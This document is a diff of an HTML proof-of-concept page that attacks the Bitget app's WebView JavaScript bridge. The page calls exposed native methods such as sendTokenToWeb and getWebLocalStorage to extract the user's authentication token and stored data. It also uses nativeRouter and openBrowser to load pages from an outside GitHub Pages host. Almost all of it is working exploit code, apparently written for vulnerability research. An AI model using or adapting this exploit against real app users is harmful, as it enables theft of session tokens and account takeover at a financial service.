@@ -1,22 +1,19 @@
-<!DOCTYPE html><html><head><title>Bitget WebView JSBridge PoC</title></head>
+<!DOCTYPE html><html><head><title>Bitget JSBridge PoC</title></head>
 <body>
-<h2>Bitget WebView JSBridge PoC</h2>
+<h2>Bitget JSBridge PoC v9</h2>
 <pre id="out">running...</pre>
 <script>
 function log(s){document.getElementById('out').textContent += "\n" + s;}
-function pocCallback(data){
-  log("LEAK RECEIVED:");
-  try { log(JSON.stringify(data)); } catch(e){ log(String(data)); }
-}
+function cb(name){ return function(d){ log("CB "+name+": "+JSON.stringify(d)); }; }
 setTimeout(function(){
-  if (window.control) {
-    log("control object present");
-    var apis = [];
-    for (var k in control) { apis.push(k); }
-    log("TOTAL KEYS: " + apis.length);
-    for (var i = 0; i < apis.length; i++) { log("[" + i + "] " + apis[i]); }
-    try { control.sendTokenToWeb('pocCallback'); log("sendTokenToWeb called"); } catch(e){ log("sTTW err: "+e); }
-  } else { log("NO control object"); }
+  if (!window.control) { log("NO control"); return; }
+  log("control present");
+  function t(name, fn){ try { fn(); log("OK called "+name); } catch(e){ log("ERR "+name+": "+e); } }
+  t("getWebLocalStorage", function(){ control.getWebLocalStorage(cb("gWLS"), "poc"); });
+  t("nativeRouter", function(){ control.nativeRouter("/web/main/h5?url=https%3A%2F%2Fcreatenewdemo.github.io%2Fbgjspoc%2F%3Fv%3Dinner"); });
+  t("openBrowser", function(){ control.openBrowser(JSON.stringify({appPackage:"com.android.chrome",appName:"Chrome",appUrl:"https://createnewdemo.github.io/bgjspoc/?v=ob"})); });
+  t("sendTokenToWeb", function(){ control.sendTokenToWeb(cb("token")); });
+  t("goNativeShare", function(){ control.goNativeShare("PoC share from internal WebView"); });
   log("done");
 }, 800);
 </script>
